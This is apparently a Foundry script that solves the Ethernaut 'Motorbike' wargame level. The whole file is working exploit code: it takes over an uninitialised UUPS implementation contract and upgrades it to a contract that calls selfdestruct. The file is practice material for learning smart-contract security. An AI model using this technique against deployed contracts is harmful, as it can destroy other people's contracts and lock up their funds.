// SPDX-License-Identifier: UNLICENSED
pragma solidity <0.7.0;
pragma experimental ABIEncoderV2;

import "src/levels/Motorbike/Motorbike.sol"; 
import "forge-std/Script.sol";

contract MotorbikeAttackScript is Script {
    function setUp() public {}

    function run() public {
        Motorbike target = Motorbike(payable(0x0000000000000000000000000000000000000000)); // Insert instance target address
                             
        vm.startBroadcast();

        bytes32 _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
       
        // Read implementation address from Motorbike instance storage
        Engine engine = Engine(
            address(
                bytes20(
                    uint160(
                        uint256(
                            vm.load(address(target), _IMPLEMENTATION_SLOT)
                        )
                    )
                )
            )
        );

        // Initialize enigne
        engine.initialize();

        // Deploy new attacker contract
        MotorbikeAttack attacker = new MotorbikeAttack();

        // Change implementation and call fuction that destroys the implementation
        engine.upgradeToAndCall(
            address(attacker),
            abi.encodeWithSignature("kill()")
        );

        vm.stopBroadcast();
    }
}

contract MotorbikeAttack {
    function kill() public payable{
        selfdestruct(payable(address(0))); 
    }
}
